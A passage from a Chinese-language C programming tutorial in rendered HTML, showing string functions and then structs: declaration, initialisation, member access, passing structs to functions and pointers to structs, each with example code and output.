class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> str1[<span class="number">12</span>] = <span class="string">"Hello"</span>;</span><br><span class="line">   <span class="keyword">char</span> str2[<span class="number">12</span>] = <span class="string">"World"</span>;</span><br><span class="line">   <span class="keyword">char</span> str3[<span class="number">12</span>];</span><br><span class="line">   <span class="keyword">int</span>  len ;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 复制 str1 到 str3 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>(str3, str1);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"strcpy( str3, str1) :  %s\n"</span>, str3 );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 连接 str1 和 str2 */</span></span><br><span class="line">   <span class="built_in">strcat</span>( str1, str2);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"strcat( str1, str2):   %s\n"</span>, str1 );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 连接后，str1 的总长度 */</span></span><br><span class="line">   len = <span class="built_in">strlen</span>(str1);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"strlen(str1) :  %d\n"</span>, len );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>( str3, str1) :  Hello</span><br><span class="line"><span class="built_in">strcat</span>( str1, str2):   HelloWorld</span><br><span class="line"><span class="built_in">strlen</span>(str1) :  <span class="number">10</span></span><br></pre></td></tr></table></figure><h2 id="C-结构体"><a href="#C-结构体" class="headerlink" title="C    结构体"></a>C    结构体</h2><p>C 数组允许定义可存储相同类型数据项的变量，<strong>结构</strong>是 C 编程中另一种用户自定义的可用的数据类型，它允许您存储不同类型的数据项。</p><p>结构用于表示一条记录，假设您想要跟踪图书馆中书本的动态，您可能需要跟踪每本书的下列属性：</p><ul><li>Title</li><li>Author</li><li>Subject</li><li>Book ID</li></ul><h3 id="定义结构"><a href="#定义结构" class="headerlink" title="定义结构"></a>定义结构</h3><p>为了定义结构，您必须使用 <strong>struct</strong> 语句。struct 语句定义了一个包含多个成员的新的数据类型，struct 语句的格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tag</span> &#123;</span> </span><br><span class="line">    member-<span class="built_in">list</span></span><br><span class="line">    member-<span class="built_in">list</span> </span><br><span class="line">    member-<span class="built_in">list</span>  </span><br><span class="line">    ...</span><br><span class="line">&#125; variable-<span class="built_in">list</span> ;</span><br></pre></td></tr></table></figure><p><strong>tag</strong> 是结构体标签。</p><p><strong>member-list</strong> 是标准的变量定义，比如 int i; 或者 float f，或者其他有效的变量定义。</p><p><strong>variable-list</strong> 结构变量，定义在结构的末尾，最后一个分号之前，您可以指定一个或多个结构变量。下面是声明 Book 结构的方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125; book;</span><br></pre></td></tr></table></figure><p> 在一般情况下，<strong>tag、member-list、variable-list</strong> 这 3 部分至少要出现 2 个。以下为实例： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c</span></span><br><span class="line"><span class="comment">//同时又声明了结构体变量s1</span></span><br><span class="line"><span class="comment">//这个结构体并没有标明其标签</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> b;</span><br><span class="line">    <span class="keyword">double</span> c;</span><br><span class="line">&#125; s1;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c</span></span><br><span class="line"><span class="comment">//结构体的标签被命名为SIMPLE,没有声明变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SIMPLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> b;</span><br><span class="line">    <span class="keyword">double</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//用SIMPLE标签的结构体，另外声明了变量t1、t2、t3</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SIMPLE</span> <span class="title">t1</span>, <span class="title">t2</span>[20], *<span class="title">t3</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//也可以用typedef创建新类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> b;</span><br><span class="line">    <span class="keyword">double</span> c; </span><br><span class="line">&#125; Simple2;</span><br><span class="line"><span class="comment">//现在可以用Simple2作为类型声明新的结构体变量</span></span><br><span class="line">Simple2 u1, u2[<span class="number">20</span>], *u3;</span><br></pre></td></tr></table></figure><p>在上面的声明中，第一个和第二声明被编译器当作两个完全不同的类型，即使他们的成员列表是一样的，如果令 t3=&amp;s1，则是非法的。</p><p>结构体的成员可以包含其他结构体，也可以包含指向自己结构体类型的指针，而通常这种指针的应用是为了实现一些更高级的数据结构如链表和树等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此结构体的声明包含了其他的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">COMPLEX</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SIMPLE</span> <span class="title">a</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//此结构体的声明包含了指向自己类型的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">next_node</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果两个结构体互相包含，则需要对其中一个结构体进行不完整声明，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">B</span>;</span>    <span class="comment">//对结构体B进行不完整声明</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//结构体A中包含指向结构体B的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">B</span> *<span class="title">partner</span>;</span></span><br><span class="line">    <span class="comment">//other members;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//结构体B中包含指向结构体A的指针，在A声明完后，B也随之进行声明</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">A</span> *<span class="title">partner</span>;</span></span><br><span class="line">    <span class="comment">//other members;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="结构体变量的初始化"><a href="#结构体变量的初始化" class="headerlink" title="结构体变量的初始化"></a>结构体变量的初始化</h3><p>和其它类型变量一样，对结构体变量可以在定义时指定初始值。</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125; book = &#123;<span class="string">"C 语言"</span>, <span class="string">"RUNOOB"</span>, <span class="string">"编程语言"</span>, <span class="number">123456</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>, book.title, book.author, book.subject, book.book_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行输出结果为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title : C 语言</span><br><span class="line">author: RUNOOB</span><br><span class="line">subject: 编程语言</span><br><span class="line">book_id: <span class="number">123456</span></span><br></pre></td></tr></table></figure><h3 id="访问结构成员"><a href="#访问结构成员" class="headerlink" title="访问结构成员"></a>访问结构成员</h3><p> 为了访问结构的成员，我们使用<strong>成员访问运算符（.）</strong>。成员访问运算符是结构变量名称和我们要访问的结构成员之间的一个句号。您可以使用 <strong>struct</strong> 关键字来定义结构类型的变量。下面的实例演示了结构的用法： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">Book1</span>;</span>        <span class="comment">/* 声明 Book1，类型为 Books */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">Book2</span>;</span>        <span class="comment">/* 声明 Book2，类型为 Books */</span></span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* Book1 详述 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.title, <span class="string">"C Programming"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.author, <span class="string">"Nuha Ali"</span>); </span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.subject, <span class="string">"C Programming Tutorial"</span>);</span><br><span class="line">   Book1.book_id = <span class="number">6495407</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* Book2 详述 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.title, <span class="string">"Telecom Billing"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.author, <span class="string">"Zara Ali"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.subject, <span class="string">"Telecom Billing Tutorial"</span>);</span><br><span class="line">   Book2.book_id = <span class="number">6495700</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 输出 Book1 信息 */</span></span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 1 title : %s\n"</span>, Book1.title);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 1 author : %s\n"</span>, Book1.author);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 1 subject : %s\n"</span>, Book1.subject);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 1 book_id : %d\n"</span>, Book1.book_id);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 输出 Book2 信息 */</span></span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 2 title : %s\n"</span>, Book2.title);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 2 author : %s\n"</span>, Book2.author);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 2 subject : %s\n"</span>, Book2.subject);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book 2 book_id : %d\n"</span>, Book2.book_id);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Book <span class="number">1</span> title : C Programming</span><br><span class="line">Book <span class="number">1</span> author : Nuha Ali</span><br><span class="line">Book <span class="number">1</span> subject : C Programming Tutorial</span><br><span class="line">Book <span class="number">1</span> book_id : <span class="number">6495407</span></span><br><span class="line">Book <span class="number">2</span> title : Telecom Billing</span><br><span class="line">Book <span class="number">2</span> author : Zara Ali</span><br><span class="line">Book <span class="number">2</span> subject : Telecom Billing Tutorial</span><br><span class="line">Book <span class="number">2</span> book_id : <span class="number">6495700</span></span><br></pre></td></tr></table></figure><h3 id="结构作为参数"><a href="#结构作为参数" class="headerlink" title="结构作为参数"></a>结构作为参数</h3><p> 您可以把结构作为函数参数，传参方式与其他类型的变量或指针类似。您可以使用上面实例中的方式来访问结构变量： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 函数声明 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBook</span><span class="params">( struct Books book )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">Book1</span>;</span>        <span class="comment">/* 声明 Book1，类型为 Books */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">Book2</span>;</span>        <span class="comment">/* 声明 Book2，类型为 Books */</span></span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* Book1 详述 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.title, <span class="string">"C Programming"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.author, <span class="string">"Nuha Ali"</span>); </span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.subject, <span class="string">"C Programming Tutorial"</span>);</span><br><span class="line">   Book1.book_id = <span class="number">6495407</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* Book2 详述 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.title, <span class="string">"Telecom Billing"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.author, <span class="string">"Zara Ali"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.subject, <span class="string">"Telecom Billing Tutorial"</span>);</span><br><span class="line">   Book2.book_id = <span class="number">6495700</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 输出 Book1 信息 */</span></span><br><span class="line">   printBook( Book1 );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 输出 Book2 信息 */</span></span><br><span class="line">   printBook( Book2 );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBook</span><span class="params">( struct Books book )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book title : %s\n"</span>, book.title);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book author : %s\n"</span>, book.author);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book subject : %s\n"</span>, book.subject);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book book_id : %d\n"</span>, book.book_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Book title : C Programming</span><br><span class="line">Book author : Nuha Ali</span><br><span class="line">Book subject : C Programming Tutorial</span><br><span class="line">Book book_id : <span class="number">6495407</span></span><br><span class="line">Book title : Telecom Billing</span><br><span class="line">Book author : Zara Ali</span><br><span class="line">Book subject : Telecom Billing Tutorial</span><br><span class="line">Book book_id : <span class="number">6495700</span></span><br></pre></td></tr></table></figure><h3 id="指向结构的指针"><a href="#指向结构的指针" class="headerlink" title="指向结构的指针"></a>指向结构的指针</h3><p>您可以定义指向结构的指针，方式与定义指向其他类型变量的指针相似，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span> *<span class="title">struct_pointer</span>;</span></span><br></pre></td></tr></table></figure><p>现在，您可以在上述定义的指针变量中存储结构变量的地址。为了查找结构变量的地址，请把 &amp; 运算符放在结构名称的前面，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct_pointer = &amp;Book1;</span><br></pre></td></tr></table></figure><p>为了使用指向该结构的指针访问结构的成员，您必须使用 -&gt; 运算符，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct_pointer-&gt;title;</span><br></pre></td></tr></table></figure><p> 让我们使用结构指针来重写上面的实例，这将有助于您理解结构指针的概念： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 函数声明 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBook</span><span class="params">( struct Books *book )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">Book1</span>;</span>        <span class="comment">/* 声明 Book1，类型为 Books */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">Book2</span>;</span>        <span class="comment">/* 声明 Book2，类型为 Books */</span></span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* Book1 详述 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.title, <span class="string">"C Programming"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.author, <span class="string">"Nuha Ali"</span>); </span><br><span class="line">   <span class="built_in">strcpy</span>( Book1.subject, <span class="string">"C Programming Tutorial"</span>);</span><br><span class="line">   Book1.book_id = <span class="number">6495407</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* Book2 详述 */</span></span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.title, <span class="string">"Telecom Billing"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.author, <span class="string">"Zara Ali"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( Book2.subject, <span class="string">"Telecom Billing Tutorial"</span>);</span><br><span class="line">   Book2.book_id = <span class="number">6495700</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 通过传 Book1 的地址来输出 Book1 信息 */</span></span><br><span class="line">   printBook( &amp;Book1 );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 通过传 Book2 的地址来输出 Book2 信息 */</span></span><br><span class="line">   printBook( &amp;Book2 );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBook</span><span class="params">( struct Books *book )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book title : %s\n"</span>, book-&gt;title);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book author : %s\n"</span>, book-&gt;author);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book subject : %s\n"</span>, book-&gt;subject);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Book book_id : %d\n"</span>, book-&gt;book_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Book title : C Programming</span><br><span class="line">Book author : Nuha Ali</span><br><span class="line">Book subject : C Programming Tutorial</span><br><span class="line">Book book_id : <span class="number">6495407</span></span><br><span class="line">Book title : Telecom Billing</span><br><span class="line">Book author : Zara Ali</span><br><span class="line">Book subject : Telecom Billing Tutorial</span><br><span class="line">Book book_id : <span class="number">6495700</span></span><br></pre></td></tr></table></figure><h3 id="位域"><a href="#位域" class="headerlink" title="位域"></a>位域</h3><p>有些信息在存储时，并不需要占用一个完整的字节，而只需占几个或一个二进制位。例如在存放一个开关量时，只有 0 和 1 两种状态，用 1 位二进位即可。为了节省存储空间，并使处理简便，C 